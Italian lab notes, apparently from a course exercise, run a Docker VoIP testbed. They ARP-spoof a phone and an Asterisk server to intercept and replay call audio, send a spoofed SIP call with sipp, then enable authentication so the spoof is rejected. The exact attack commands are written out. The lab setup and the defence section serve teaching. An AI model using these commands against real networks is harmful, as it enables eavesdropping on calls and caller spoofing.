# Attacco 1 

prima di tutto avviamo i container con docker compose up 

poi entriamo nel terminale dell' attaccante docker exec -it voip-attacker bash

verifichiamo ip_forward cat /proc/sys/net/ipv4/ip_forward

Poi avviamo ARp spoofing:
# 1) dì alla VITTIMA che "Asterisk sei tu"
arpspoof -i eth0 -t 172.20.0.20 172.20.0.10 > /dev/null 2>&1 &

# 2) dì ad ASTERISK che "la vittima sei tu"
arpspoof -i eth0 -t 172.20.0.10 172.20.0.20 > /dev/null 2>&1 &

# 3) cattura tutto il traffico UDP (SIP + RTP) su file
tcpdump -i eth0 -w /captures/voip.pcap udp

In un secondo terminale avvio la telefonata

docker attach voip-phone

digito 500 e dopo 15 sec premo b, poi ctrl p e ctrl q

ritorno nell altro terminale, premo ctrl c e poi pkill arpspoof e exit

con wireshark captures/voip.pcap 
ascolto l audio (telephony -> rtp -> rtp streams)

#ATTACCO 2

## 1) Accediamo al logger SIP di Asterisk
docker exec voip-asterisk asterisk -rx "pjsip set logger on"

## 2) Chiamata falsificata dallo spoofer
docker exec -it voip-spoofer sipp -sf /root/spoof.xml 172.20.0.10:5060 -m 1 -nostdin

## 3) Mostrare l'attaco
sia controllando log asterisk, sia utilizzando wireshark.



# DIFESA ATTACCO 2 (spoofing) — Autenticazione

## 0) Pulizia (necessaria quando si cambia profilo)
# Rimuove i container di ENTRAMBI i profili, incluso il vecchio "voip-asterisk"
# rimasto attivo: senza questo, il nuovo centralino va in conflitto sul nome.
docker compose --profile insecure --profile secure down --remove-orphans

## 1) Avvio del centralino SICURO
# le chiamate non autenticate vengono rifiutate.
docker compose --profile secure up --build

## 2) Verifica che la falla sia chiusa
# Devono comparire solo 6001 e 6002 — NIENTE "anonymous".
docker exec voip-asterisk asterisk -rx "pjsip show endpoints"

## 3) Riprovo lo STESSO spoof dell'attacco 2
docker exec -it voip-spoofer sipp -sf /root/spoof.xml 172.20.0.10:5060 -m 1 -nostdin

## 4) Risultato atteso: l'attacco FALLISCE
# - sipp riporta "Failed call: 1" (prima era "Successful call: 1")
# - Asterisk risponde "401 Unauthorized" con header "WWW-Authenticate"
#   -> chiede le credenziali; lo spoofer non le ha, quindi non passa.

## (Opzionale) Prova che gli utenti VERI funzionano ancora
# Dimostra che la difesa blocca gli attaccanti senza rompere il servizio.
docker attach voip-phone     # digito 500 + Invio; deve funzionare. 'b', poi Ctrl-P Ctrl-Q



